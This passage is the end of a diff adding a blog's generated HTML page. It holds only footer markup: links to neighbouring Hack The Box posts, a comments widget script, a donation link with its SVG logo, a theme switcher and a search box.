0-13.8-11-24.9-24.9-24.9z"/></svg>
+</span></a
+        >
+      
+    
+  </section>
+
+
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="group flex" href="/blog/htb-download/">
+              <span
+                class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&larr;</span
+                ><span class="ltr:hidden rtl:inline">&rarr;</span></span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >HTB Download</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2023-11-27 15:13:42 &#43;0530 IST">27 November 2023</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="group flex text-right" href="/blog/htb-coder/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >HTB Coder</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2023-12-17 05:28:27 &#43;0530 IST">17 December 2023</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ms-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&rarr;</span
+                ><span class="ltr:hidden rtl:inline">&larr;</span></span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+        
+          <div class="pt-3">
+            <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+            <div class="pt-3">
+              <script
+    src="https://giscus.app/client.js"
+    data-repo="AbraXa5/personal-blog"
+    data-repo-id="R_kgDOJxB9Aw"
+    data-category="Q&A"
+    data-category-id="DIC_kwDOJxB9A84CXU6d"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="dark_dimmed"
+    data-lang="en"
+    data-loading="lazy"
+    crossorigin="anonymous"
+    async
+></script>
+
+            </div>
+          </div>
+        
+      
+    </footer>
+  </article>
+
+        
+          <div class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12">
+            <a
+              href="#the-top"
+              class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+              aria-label="Scroll to top"
+              title="Scroll to top"
+            >
+              &uarr;
+            </a>
+          </div>
+        
+      </main><footer class="py-10 print:hidden">
+  
+  
+    <nav class="pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
+      <ul class="flex list-none flex-col sm:flex-row">
+        
+          
+          <li class="group mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0">
+            
+              <a
+                href="https://www.buymeacoffee.com/abr4xa5"
+                title=""
+                target="_blank"
+                >
+                  <span
+                    class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
+                  ><span class="icon relative inline-block px-1 align-text-bottom"><svg width="884" height="1279" viewBox="0 0 884 1279" fill="none" xmlns="http://www.w3.org/2000/svg">
+    <path d="M791.109 297.518L790.231 297.002L788.201 296.383C789.018 297.072 790.04 297.472 791.109 297.518V297.518Z"
+        fill="#0D0C22" />
+    <path d="M803.896 388.891L802.916 389.166L803.896 388.891Z" fill="#0D0C22" />
+    <path
+        d="M791.484 297.377C791.359 297.361 791.237 297.332 791.118 297.29C791.111 297.371 791.111 297.453 791.118 297.534C791.252 297.516 791.379 297.462 791.484 297.377V297.377Z"
+        fill="#0D0C22" />
+    <path d="M791.113 297.529H791.244V297.447L791.113 297.529Z" fill="#0D0C22" />
+    <path
+        d="M803.111 388.726L804.591 387.883L805.142 387.573L805.641 387.04C804.702 387.444 803.846 388.016 803.111 388.726V388.726Z"
+        fill="#0D0C22" />
+    <path d="M793.669 299.515L792.223 298.138L791.243 297.605C791.77 298.535 792.641 299.221 793.669 299.515V299.515Z"
+        fill="#0D0C22" />
+    <path
+        d="M430.019 1186.18C428.864 1186.68 427.852 1187.46 427.076 1188.45L427.988 1187.87C428.608 1187.3 429.485 1186.63 430.019 1186.18Z"
+        fill="#0D0C22" />
+    <path
+        d="M641.187 1144.63C641.187 1143.33 640.551 1143.57 640.705 1148.21C640.705 1147.84 640.86 1147.46 640.929 1147.1C641.015 1146.27 641.084 1145.46 641.187 1144.63Z"
+        fill="#0D0C22" />
+    <path
+        d="M619.284 1186.18C618.129 1186.68 617.118 1187.46 616.342 1188.45L617.254 1187.87C617.873 1187.3 618.751 1186.63 619.284 1186.18Z"
+        fill="#0D0C22" />
+    <path
+        d="M281.304 1196.06C280.427 1195.3 279.354 1194.8 278.207 1194.61C279.136 1195.06 280.065 1195.51 280.684 1195.85L281.304 1196.06Z"
+        fill="#0D0C22" />
+    <path
+        d="M247.841 1164.01C247.704 1162.66 247.288 1161.35 246.619 1160.16C247.093 1161.39 247.489 1162.66 247.806 1163.94L247.841 1164.01Z"
+        fill="#0D0C22" />
+    <path
+        d="M472.623 590.836C426.682 610.503 374.546 632.802 306.976 632.802C278.71 632.746 250.58 628.868 223.353 621.274L270.086 1101.08C271.74 1121.13 280.876 1139.83 295.679 1153.46C310.482 1167.09 329.87 1174.65 349.992 1174.65C349.992 1174.65 416.254 1178.09 438.365 1178.09C462.161 1178.09 533.516 1174.65 533.516 1174.65C553.636 1174.65 573.019 1167.08 587.819 1153.45C602.619 1139.82 611.752 1121.13 613.406 1101.08L663.459 570.876C641.091 563.237 618.516 558.161 593.068 558.161C549.054 558.144 513.591 573.303 472.623 590.836Z"
+        fill="#FFDD00" />
+    <path d="M78.6885 386.132L79.4799 386.872L79.9962 387.182C79.5987 386.787 79.1603 386.435 78.6885 386.132V386.132Z"
+        fill="#0D0C22" />
+    <path
+        d="M879.567 341.849L872.53 306.352C866.215 274.503 851.882 244.409 819.19 232.898C808.711 229.215 796.821 227.633 788.786 220.01C780.751 212.388 778.376 200.55 776.518 189.572C773.076 169.423 769.842 149.257 766.314 129.143C763.269 111.85 760.86 92.4243 752.928 76.56C742.604 55.2584 721.182 42.8009 699.88 34.559C688.965 30.4844 677.826 27.0375 666.517 24.2352C613.297 10.1947 557.342 5.03277 502.591 2.09047C436.875 -1.53577 370.983 -0.443234 305.422 5.35968C256.625 9.79894 205.229 15.1674 158.858 32.0469C141.91 38.224 124.445 45.6399 111.558 58.7341C95.7448 74.8221 90.5829 99.7026 102.128 119.765C110.336 134.012 124.239 144.078 138.985 150.737C158.192 159.317 178.251 165.846 198.829 170.215C256.126 182.879 315.471 187.851 374.007 189.968C438.887 192.586 503.87 190.464 568.44 183.618C584.408 181.863 600.347 179.758 616.257 177.304C634.995 174.43 647.022 149.928 641.499 132.859C634.891 112.453 617.134 104.538 597.055 107.618C594.095 108.082 591.153 108.512 588.193 108.942L586.06 109.252C579.257 110.113 572.455 110.915 565.653 111.661C551.601 113.175 537.515 114.414 523.394 115.378C491.768 117.58 460.057 118.595 428.363 118.647C397.219 118.647 366.058 117.769 334.983 115.722C320.805 114.793 306.661 113.611 292.552 112.177C286.134 111.506 279.733 110.801 273.333 110.009L267.241 109.235L265.917 109.046L259.602 108.134C246.697 106.189 233.792 103.953 221.025 101.251C219.737 100.965 218.584 100.249 217.758 99.2193C216.932 98.1901 216.482 96.9099 216.482 95.5903C216.482 94.2706 216.932 92.9904 217.758 91.9612C218.584 90.9319 219.737 90.2152 221.025 89.9293H221.266C232.33 87.5721 243.479 85.5589 254.663 83.8038C258.392 83.2188 262.131 82.6453 265.882 82.0832H265.985C272.988 81.6186 280.026 80.3625 286.994 79.5366C347.624 73.2302 408.614 71.0801 469.538 73.1014C499.115 73.9618 528.676 75.6996 558.116 78.6935C564.448 79.3474 570.746 80.0357 577.043 80.8099C579.452 81.1025 581.878 81.4465 584.305 81.7391L589.191 82.4445C603.438 84.5667 617.61 87.1419 631.708 90.1703C652.597 94.7128 679.422 96.1925 688.713 119.077C691.673 126.338 693.015 134.408 694.649 142.03L696.731 151.752C696.786 151.926 696.826 152.105 696.852 152.285C701.773 175.227 706.7 198.169 711.632 221.111C711.994 222.806 712.002 224.557 711.657 226.255C711.312 227.954 710.621 229.562 709.626 230.982C708.632 232.401 707.355 233.6 705.877 234.504C704.398 235.408 702.75 235.997 701.033 236.236H700.895L697.884 236.649L694.908 237.044C685.478 238.272 676.038 239.419 666.586 240.486C647.968 242.608 629.322 244.443 610.648 245.992C573.539 249.077 536.356 251.102 499.098 252.066C480.114 252.57 461.135 252.806 442.162 252.771C366.643 252.712 291.189 248.322 216.173 239.625C208.051 238.662 199.93 237.629 191.808 236.58C198.106 237.389 187.231 235.96 185.029 235.651C179.867 234.928 174.705 234.177 169.543 233.397C152.216 230.798 134.993 227.598 117.7 224.793C96.7944 221.352 76.8005 223.073 57.8906 233.397C42.3685 241.891 29.8055 254.916 21.8776 270.735C13.7217 287.597 11.2956 305.956 7.64786 324.075C4.00009 342.193 -1.67805 361.688 0.472751 380.288C5.10128 420.431 33.165 453.054 73.5313 460.35C111.506 467.232 149.687 472.807 187.971 477.556C338.361 495.975 490.294 498.178 641.155 484.129C653.44 482.982 665.708 481.732 677.959 480.378C681.786 479.958 685.658 480.398 689.292 481.668C692.926 482.938 696.23 485.005 698.962 487.717C701.694 490.429 703.784 493.718 705.08 497.342C706.377 500.967 706.846 504.836 706.453 508.665L702.633 545.797C694.936 620.828 687.239 695.854 679.542 770.874C671.513 849.657 663.431 928.434 655.298 1007.2C653.004 1029.39 650.71 1051.57 648.416 1073.74C646.213 1095.58 645.904 1118.1 641.757 1139.68C635.218 1173.61 612.248 1194.45 578.73 1202.07C548.022 1209.06 516.652 1212.73 485.161 1213.01C450.249 1213.2 415.355 1211.65 380.443 1211.84C343.173 1212.05 297.525 1208.61 268.756 1180.87C243.479 1156.51 239.986 1118.36 236.545 1085.37C231.957 1041.7 227.409 998.039 222.9 954.381L197.607 711.615L181.244 554.538C180.968 551.94 180.693 549.376 180.435 546.76C178.473 528.023 165.207 509.681 144.301 510.627C126.407 511.418 106.069 526.629 108.168 546.76L120.298 663.214L145.385 904.104C152.532 972.528 159.661 1040.96 166.773 1109.41C168.15 1122.52 169.44 1135.67 170.885 1148.78C178.749 1220.43 233.465 1259.04 301.224 1269.91C340.799 1276.28 381.337 1277.59 421.497 1278.24C472.979 1279.07 524.977 1281.05 575.615 1271.72C650.653 1257.95 706.952 1207.85 714.987 1130.13C717.282 1107.69 719.576 1085.25 721.87 1062.8C729.498 988.559 737.115 914.313 744.72 840.061L769.601 597.451L781.009 486.263C781.577 480.749 783.905 475.565 787.649 471.478C791.392 467.391 796.352 464.617 801.794 463.567C823.25 459.386 843.761 452.245 859.023 435.916C883.318 409.918 888.153 376.021 879.567 341.849ZM72.4301 365.835C72.757 365.68 72.1548 368.484 71.8967 369.792C71.8451 367.813 71.9483 366.058 72.4301 365.835ZM74.5121 381.94C74.6842 381.819 75.2003 382.508 75.7337 383.334C74.925 382.576 74.4089 382.009 74.4949 381.94H74.5121ZM76.5597 384.641C77.2996 385.897 77.6953 386.689 76.5597 384.641V384.641ZM80.672 387.979H80.7752C80.7752 388.1 80.9645 388.22 81.0333 388.341C80.9192 388.208 80.7925 388.087 80.6548 387.979H80.672ZM800.796 382.989C793.088 390.319 781.473 393.726 769.996 395.43C641.292 414.529 510.713 424.199 380.597 419.932C287.476 416.749 195.336 406.407 103.144 393.382C94.1102 392.109 84.3197 390.457 78.1082 383.798C66.4078 371.237 72.1548 345.944 75.2003 330.768C77.9878 316.865 83.3218 298.334 99.8572 296.355C125.667 293.327 155.64 304.218 181.175 308.09C211.917 312.781 242.774 316.538 273.745 319.36C405.925 331.405 540.325 329.529 671.92 311.91C695.905 308.686 719.805 304.941 743.619 300.674C764.835 296.871 788.356 289.731 801.175 311.703C809.967 326.673 811.137 346.701 809.778 363.615C809.359 370.984 806.139 377.915 800.779 382.989H800.796Z"
+        fill="#0D0C22" />
+</svg>
+</span></span><span
+                    class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                    >BuyMeACoffee</span
+                  >
+                </a
+              >
+            
+          </li>
+        
+      </ul>
+    </nav>
+  
+  <div class="flex items-center justify-between">
+    <div>
+      
+      
+        <p class="text-sm text-neutral-500 dark:text-neutral-400">
+            &copy;
+            2024
+            Abraxas
+        </p>
+      
+      
+      
+    </div>
+    <div class="flex flex-row items-center">
+      
+      
+      
+      
+        <div
+          class="me-14 cursor-pointer text-sm text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        >
+          <button id="appearance-switcher-0" type="button" aria-label="appearance switcher">
+            <div
+              class="flex h-12 w-12 items-center justify-center dark:hidden"
+              title="Switch to dark appearance"
+            >
+              <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+            </div>
+            <div
+              class="hidden h-12 w-12 items-center justify-center dark:flex"
+              title="Switch to light appearance"
+            >
+              <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+            </div>
+          </button>
+        </div>
+      
+    </div>
+  </div>
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 z-50 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm sm:p-6 md:p-[10vh] lg:p-[12vh] dark:bg-neutral-900/50"
+  data-url="//localhost:1313/"
+>
+  <div
+    id="search-modal"
+    class="top-20 mx-auto flex min-h-0 w-full max-w-3xl flex-col rounded-md border border-neutral-200 bg-neutral shadow-lg dark:border-neutral-700 dark:bg-neutral-800"
+  >
+    <header class="relative z-10 flex flex-none items-center justify-between px-2">
+      <form class="flex min-w-0 flex-auto items-center">
+        <div class="flex h-8 w-8 items-center justify-center text-neutral-400">
+          <span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="mx-1 flex h-12 flex-auto appearance-none bg-transparent focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex h-8 w-8 items-center justify-center text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)"
+      >
+        <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </button>
+    </header>
+    <section class="flex-auto overflow-auto px-2">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+  </body>
+</html>
